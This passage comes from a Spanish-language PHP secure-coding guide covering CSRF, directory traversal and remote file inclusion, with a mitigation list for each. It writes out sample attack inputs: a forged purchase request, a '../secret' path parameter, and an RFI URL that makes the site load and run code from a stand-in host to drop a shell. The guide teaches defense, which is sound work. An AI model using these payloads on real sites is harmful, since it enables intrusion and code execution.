</code></pre></div></div> <h3 id="354-csrf-cross-site-request-forgery"> <a href="#354-csrf-cross-site-request-forgery" class="anchor-heading" aria-labelledby="354-csrf-cross-site-request-forgery"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.5.4. CSRF (cross site request forgery) </h3> <p>Explota la confianza que tiene un sitio web en la identidad de un usuario.</p> <p>Un ejemplo sería enviar los siguientes datos en la petición:</p> <p>GET /buy.php?symbol=SCOX&amp;quantity=1000 HTTP/1.1 Host: stocks.example.org User-Agent: Mozilla/5.0 Gecko Accept: text/xml, image/png, image/jpeg, image/gif, <em>/</em> Cookie: PHPSESSID=1234</p> <p>Se recomienda:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>• Utilizar POST en lugar de GET en los formularios. Sobre todo cuando se esté realizando una acción que involucra una compra.
• Utilizar $_POST en lugar de confiar en register_globals. Utilizar el método POST es inútil si se confía en register_globals y se referencian variables como $symbol o $quantity. Lo mismo sucede si se utiliza $_REQUEST.
• Generar un token único para cada petición y verificarlo posteriormente.
</code></pre></div></div> <h3 id="355-dt-directory-transversal"> <a href="#355-dt-directory-transversal" class="anchor-heading" aria-labelledby="355-dt-directory-transversal"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.5.5. DT (directory transversal) </h3> <p>Este ataque se produce cuando se especifican rutas de ficheros como “../../../../file” en los datos del formulario y mediante un script se llama a estos ficheros, proporcionando a un atacante la posibilidad de realizar cambios en el sistema de ficheros.</p> <p>Si dentro del script de PHP se incluye algo como require $page . ‘.php’; sabiendo que esta página se almacena en /home/someone/public_html/index.php, un atacante podría hacer index.php?page=../secret accediendo a /home/someone/secret.php</p> <p>Se recomienda:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>• Tener un array de páginas válidas.
• Comprobar que el archivo solicitado coincide con un formato concreto.
</code></pre></div></div> <h3 id="356-rfi-remote-file-inclusion"> <a href="#356-rfi-remote-file-inclusion" class="anchor-heading" aria-labelledby="356-rfi-remote-file-inclusion"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.5.6. RFI (remote file inclusion) </h3> <p>Como su nombre indica, se produce cuando se incluye un archivo remoto.</p> <p>Por ejemplo, si existe un archivo en la ruta http://example.com/malice.php y nuestro script se encuentra en http://site.com/index.php. Un atacante puede hacer esta petición: http://site.com/index.php?page=http://example.com/malice lo que provocará que el archivo se ejecute y escriba un nuevo fichero en disco, pudiendo ser este fichero una shell que permita la ejecución de comandos.</p> <p>O, por ejemplo, se podría asignar a page el valor http://example.com/malice.php? seguido de una consulta a base de datos.</p> <p>Se recomienda:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>• No confiar en los datos que no provengan de nuestro sistema.
• Se deben validar los datos que introduce el usuario.
</code></pre></div></div> </div> </div> <div class="search-overlay"></div> </div> </body> </html>
